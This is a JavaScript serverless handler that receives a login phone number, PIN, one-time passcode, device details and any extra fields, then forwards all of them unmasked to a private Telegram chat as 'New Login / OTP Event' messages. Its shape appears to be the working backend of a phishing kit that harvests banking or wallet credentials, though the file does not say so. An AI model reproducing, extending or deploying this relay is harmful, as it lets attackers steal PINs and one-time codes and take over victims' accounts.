// /api/sendTelegram.js
// FULL, VERBOSE, DIAGNOSTIC VERSION
// Safe for Telegram HTML, no [object Object], no silent drops

export default async function handler(req, res) {
  /* ===============================
     1. METHOD CHECK
  =============================== */
  if (req.method !== 'POST') {
    return res.status(405).send('Method not allowed');
  }

  /* ===============================
     2. ENV VARIABLES
  =============================== */
  const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('Missing env vars:', {
      TELEGRAM_TOKEN: !!TELEGRAM_TOKEN,
      TELEGRAM_CHAT_ID: !!TELEGRAM_CHAT_ID
    });
    return res
      .status(500)
      .send('Missing TELEGRAM_TOKEN or TELEGRAM_CHAT_ID');
  }

  /* ===============================
     3. PARSE REQUEST BODY SAFELY
  =============================== */
  let payload = {};
  try {
    if (typeof req.body === 'string') {
      payload = JSON.parse(req.body || '{}');
    } else {
      payload = req.body || {};
    }
  } catch (err) {
    console.error('Invalid JSON body:', err.message);
    return res.status(400).send('Invalid JSON');
  }

  /* ===============================
     4. HELPER FUNCTIONS
  =============================== */

  // Escape text for Telegram HTML
  function escHTML(value) {
    if (value === null || value === undefined) return '';
    return String(value)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;');
  }

  // Force any value into readable string
  function toSafeString(value) {
    if (value === null || value === undefined) return '';
    if (typeof value === 'object') {
      try {
        return JSON.stringify(value);
      } catch {
        return '[unserializable object]';
      }
    }
    return String(value);
  }

  // Mask sensitive values for server logs
  function mask(value) {
    if (!value) return '';
    const s = String(value);
    if (s.length <= 2) return '*'.repeat(s.length);
    return '*'.repeat(s.length - 2) + s.slice(-2);
  }

  /* ===============================
     5. LOG PAYLOAD (MASKED)
  =============================== */
  const logged = { ...payload };
  if (logged.loginPin) logged.loginPin = mask(logged.loginPin);
  if (logged.otp) logged.otp = mask(logged.otp);

  console.log(
    '[sendTelegram] Incoming payload:',
    JSON.stringify(logged, null, 2)
  );

  /* ===============================
     6. BUILD TELEGRAM MESSAGE
  =============================== */
  let text = '<b>New Login / OTP Event</b>\n\n';

  // Time
  if (payload.submittedAt) {
    text += `<b>Time:</b> ${escHTML(payload.submittedAt)}\n\n`;
  }

  // Login details
  if (payload.loginPhone) {
    text += '<b>Login Details</b>\n';
    text += `<b>Phone:</b> ${escHTML(payload.loginPhone)}\n`;
  }

  if (payload.loginPin) {
    text += `<b>PIN:</b> ${escHTML(payload.loginPin)}\n`;
  }

  if (payload.otp) {
    text += `<b>OTP:</b> ${escHTML(payload.otp)}\n`;
  }

  if (payload.loginPhone || payload.loginPin || payload.otp) {
    text += '\n';
  }

  // Device (STRING ONLY)
  if (payload.device) {
    text += `<b>Device:</b> ${escHTML(payload.device)}\n\n`;
  }

  /* ===============================
     7. OTHER FIELDS (SAFE)
  =============================== */
  const ignoredKeys = new Set([
    'submittedAt',
    'loginPhone',
    'loginPin',
    'otp',
    'device'
  ]);

  const extraKeys = Object.keys(payload).filter(
    k => !ignoredKeys.has(k)
  );

  if (extraKeys.length) {
    text += '<b>Other Data</b>\n';
    for (const key of extraKeys) {
      const safeVal = toSafeString(payload[key]);
      text += `<b>${escHTML(key)}:</b> ${escHTML(safeVal)}\n`;
    }
  }

  /* ===============================
     8. SEND TO TELEGRAM
  =============================== */
  const telegramURL =
    `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

  try {
    const telegramResp = await fetch(telegramURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      })
    });

    const telegramText = await telegramResp.text();

    console.log(
      '[sendTelegram] Telegram response:',
      telegramResp.status,
      telegramText
    );

    if (!telegramResp.ok) {
      return res
        .status(502)
        .send('Telegram API error: ' + telegramText);
    }

    return res.status(200).send(telegramText);
  } catch (err) {
    console.error(
      '[sendTelegram] Network error:',
      err && err.message
    );
    return res
      .status(500)
      .send('Failed to contact Telegram API');
  }
}
